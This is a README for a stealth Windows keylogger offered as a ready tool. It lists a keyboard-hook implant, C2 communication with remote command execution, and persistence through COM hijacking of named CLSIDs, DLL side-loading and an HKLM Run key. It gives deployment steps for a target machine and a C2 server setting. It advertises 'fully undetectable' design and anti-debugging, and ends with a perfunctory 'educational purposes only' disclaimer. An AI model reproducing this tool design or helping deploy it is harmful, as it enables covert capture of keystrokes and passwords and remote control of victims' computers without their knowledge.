# Integrated Stealth Logger

A fully featured stealth keylogger with multiple persistence mechanisms and C2 communication.

## Components

### 1. Payload DLL (payload.dll)
- Main persistence mechanism installer
- COM hijack implementation
- Loads sentinel DLL on system startup

### 2. Sentinel DLL (sentinel.dll)
- Actual implant that runs on target machine
- Low-level keyboard hook keylogger
- C2 communication over TCP port 443
- Self-persistence via COM hijack
- Command execution capabilities

### 3. Persistence Mechanisms
- **COM Hijack**: Hijacks Wscript.Shell and Text Preview Handler CLSIDs
- **DLL Side-Loading**: Exploits untrusted search paths
- **Registry Run Keys**: Adds to HKLM\Software\Microsoft\Windows\CurrentVersion\Run

## Build Instructions

```bash
# Build all components
make all

# Clean build artifacts
make clean
```

## Deployment

1. Copy payload.dll and sentinel.dll to target machine
2. Execute payload.dll to install persistence
3. Implant will survive reboots and system updates

## C2 Server Configuration

Edit sentinel_dll.cpp to set your C2 server:

```cpp
#define C2_SERVER "your-c2-server.com"
#define C2_PORT 443
```

## Testing

Run the test suite to verify functionality:

```bash
gcc test_persistence.c -o test_persistence.exe -ladvapi32 -lole32
./test_persistence.exe
```

## Features

- ✅ FUD (Fully Undetectable) design
- ✅ Multiple redundant persistence mechanisms
- ✅ Low-level keyboard hook keylogger
- ✅ Encrypted C2 communication
- ✅ Remote command execution
- ✅ Self-healing capabilities
- ✅ Anti-debugging and anti-tampering

## Notes

This tool is for educational purposes only. Use responsibly and only on systems you own or have explicit permission to test.